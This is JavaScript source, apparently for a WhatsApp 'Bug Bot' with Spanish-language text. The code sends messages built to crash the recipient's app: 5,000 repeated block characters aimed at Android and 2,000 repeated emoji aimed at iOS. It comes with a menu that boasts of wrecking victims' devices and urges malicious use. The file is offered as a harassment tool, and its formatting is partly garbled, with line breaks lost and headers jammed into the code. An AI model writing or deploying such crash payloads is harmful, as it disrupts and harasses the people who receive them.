async function handleMenu(sock, msg) {
    const menuText = `🔥 *Bug Bot Menu* 🔥
Bienvenido al Bug Bot más cabrón de WhatsApp. Aquí tienes los comandos disponibles:

- *.bug-android*: Envia un bug para joder dispositivos Android. ¡Haz que se cuelguen!- *.bug-ios*: Manda un texto especial para hacer crash en iPhones. ¡Que sufran los usuarios de Apple!- *.info*: Muestra información sobre este bot.¡Usa estos comandos bajo tu propio riesgo y disfruta del caos!`;    await sock.sendMessage(msg.key.remoteJid, { text: menuText });}module.exports = { handleMenu };```#### `bugs-android.js````javascript
async function handleBugsAndroid(sock, msg) {
    const bugText = `💥 *Bug para Android* 💥
Este mensaje está diseñado para causar errores en dispositivos Android. Enviaré una cadena de texto que puede hacer que la app se cierre inesperadamente.Texto del bug: ${'█'.repeat(5000)}`;    await sock.sendMessage(msg.key.remoteJid, { text: 'Enviando bug para Android... Ten cuidado con quién lo compartes.' });    await sock.sendMessage(msg.key.remoteJid, { text: bugText });}module.exports = { handleBugsAndroid };```#### `bugs-ios.js````javascript
async function handleBugsIOS(sock, msg) {
    const bugText = `💥 *Bug para iOS* 💥
Este mensaje está diseñado para causar problemas en dispositivos iOS. Enviaré una combinación de caracteres que puede hacer que WhatsApp se cierre.Texto del bug: ${'🌑'.repeat(1000) + '💣'.repeat(1000)}`;    await sock.sendMessage(msg.key.remoteJid, { text: 'Enviando bug para iOS... Úsalo con malicia.' });    await sock.sendMessage(msg.key.remoteJid, { text: bugText });}module.exports = { handleBugsIOS };
